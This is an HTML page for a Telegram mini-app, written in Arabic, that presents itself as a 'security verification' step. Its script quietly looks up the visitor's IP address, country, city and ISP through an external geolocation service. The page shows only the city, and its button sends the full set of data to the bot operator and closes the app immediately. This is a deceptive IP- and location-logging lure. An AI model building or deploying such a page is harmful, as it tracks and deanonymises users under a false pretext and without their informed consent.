<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد البيانات</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: var(--tg-theme-bg-color, #18222d);
            color: var(--tg-theme-text-color, #ffffff);
            padding: 30px;
            text-align: center;
        }
        .card {
            background-color: var(--tg-theme-secondary-bg-color, #232e3c);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: right;
        }
        .btn {
            background-color: #2bba53;
            color: #ffffff;
            border: none;
            padding: 15px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 18px;
            width: 100%;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h2>🔐 التحقق من الأمان</h2>
    <div class="card" id="info">
        <p>جارِ قراءة بيانات الاتصال...</p>
    </div>

    <button class="btn" onclick="sendNow()">إتمام وإرسال البيانات 🚀</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let payload = {};

        fetch('https://ipwho.is/')
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    payload.ip = data.ip;
                    payload.country = data.country;
                    payload.city = data.city;
                    payload.isp = data.connection.isp;
                    
                    document.getElementById('info').innerHTML = `
                        <p><b>حالة الاتصال:</b> متصل ✅</p>
                        <p><b>المدينة:</b> ${data.city}</p>
                    `;
                }
            }).catch(() => {
                document.getElementById('info').innerHTML = `<p>فشل جلب الشبكة</p>`;
            });

        function sendNow() {
            // إرسال البيانات المجمعة وإغلاق التطبيق فوراً
            tg.sendData(JSON.stringify(payload));
            tg.close();
        }
    </script>
</body>
</html>
